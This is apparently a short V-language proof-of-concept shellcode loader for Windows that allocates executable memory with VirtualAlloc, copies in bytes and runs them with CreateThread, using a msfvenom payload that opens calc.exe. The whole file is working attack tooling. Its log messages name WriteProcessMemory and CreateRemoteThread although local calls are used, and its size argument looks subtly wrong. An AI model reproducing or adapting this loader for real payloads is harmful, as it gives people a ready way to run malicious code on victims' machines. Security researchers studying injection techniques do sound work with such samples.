module main

import time

#flag -luser32
#flag -lkernel32

fn C.VirtualAlloc(voidptr, size_t, u32, u32) voidptr
fn C.RtlMoveMemory(voidptr, voidptr, size_t)
fn C.CreateThread(voidptr, size_t, voidptr, voidptr, u32, &u32) voidptr

fn inject(shellcode []byte) bool {
    println('Creating virtualAlloc')
    address_pointer := C.VirtualAlloc(voidptr(0), size_t(sizeof(shellcode)), 0x3000, 0x40)
    println(address_pointer)

    println('WriteProcessMemory')
    C.RtlMoveMemory(address_pointer, shellcode.data, shellcode.len)

    println('CreateRemoteThread')
    C.CreateThread(voidptr(0), size_t(0), voidptr(address_pointer), voidptr(0), 0, &u32(0))
    time.sleep(1000)
    return true
}

fn main() {
    // msfvenom -a x86 -p windows/exec CMD=calc.exe -f c -b '\x00'
    shellcode := [
        byte(0xda),0xc0,0xbf,0x66,0x3a,0x39,0xe5,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,
        ..snip..
        0x52,0x8c,0x43,0x2f,0x3e,0x7d,0xe6,0xd7,0xa5,0x81]
    inject(shellcode)
}